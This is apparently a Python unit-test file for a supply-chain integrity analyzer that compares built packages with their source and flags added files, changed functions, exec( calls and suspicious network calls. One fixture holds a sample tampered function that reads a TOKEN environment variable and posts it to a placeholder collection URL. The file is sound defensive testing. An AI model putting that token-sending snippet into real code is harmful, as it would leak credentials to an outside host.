from pathlib import Path
from tempfile import TemporaryDirectory
import unittest

from guardchain.integrity_analyzer import analyze_integrity, extract_source_repository_hint


class IntegrityAnalyzerTests(unittest.TestCase):
    def test_new_file_detection(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = root / "source"
            dist = root / "dist"
            source.mkdir()
            dist.mkdir()
            (dist / "payload.py").write_text("x = 1", encoding="utf-8")
            rules = {finding.rule_id for finding in analyze_integrity(dist, source)}
        self.assertIn("I001", rules)

    def test_comment_only_change_ignored(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = root / "source"
            dist = root / "dist"
            source.mkdir()
            dist.mkdir()
            (source / "a.py").write_text("x = 1\n", encoding="utf-8")
            (dist / "a.py").write_text("# comment\nx = 1\n", encoding="utf-8")
            rules = {finding.rule_id for finding in analyze_integrity(dist, source)}
        self.assertNotIn("I002", rules)

    def test_modified_file_reports_changed_function_and_new_dangerous_token(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = root / "source"
            dist = root / "dist"
            source.mkdir()
            dist.mkdir()
            (source / "a.py").write_text("def run():\n    return 1\n", encoding="utf-8")
            (dist / "a.py").write_text("def run():\n    exec('print(1)')\n", encoding="utf-8")
            findings = analyze_integrity(dist, source)
        modified = next(finding for finding in findings if finding.rule_id == "I002")
        self.assertIn("run", modified.evidence["changed_functions"])
        self.assertIn("exec(", modified.evidence["new_dangerous_tokens"])

    def test_modified_file_reports_added_suspicious_call_summary(self) -> None:
        with TemporaryDirectory() as tmp:
            root = Path(tmp)
            source = root / "source"
            dist = root / "dist"
            source.mkdir()
            dist.mkdir()
            (source / "a.py").write_text("def run():\n    return 'ok'\n", encoding="utf-8")
            (dist / "a.py").write_text(
                "import os, requests\n"
                "def run():\n"
                "    token = os.getenv('TOKEN')\n"
                "    requests.post('https://example.invalid/collect', data=token)\n",
                encoding="utf-8",
            )
            findings = analyze_integrity(dist, source)
        modified = next(finding for finding in findings if finding.rule_id == "I002")
        self.assertIn("requests.post", modified.evidence["added_suspicious_calls"])
        self.assertIn("I004", {finding.rule_id for finding in findings})

    def test_extract_source_repository_hint(self) -> None:
        metadata = {"project_urls": {"Repository": "https://github.com/example/project"}, "version": "1.0.0"}
        self.assertEqual(extract_source_repository_hint(metadata), "https://github.com/example/project")


if __name__ == "__main__":
    unittest.main()
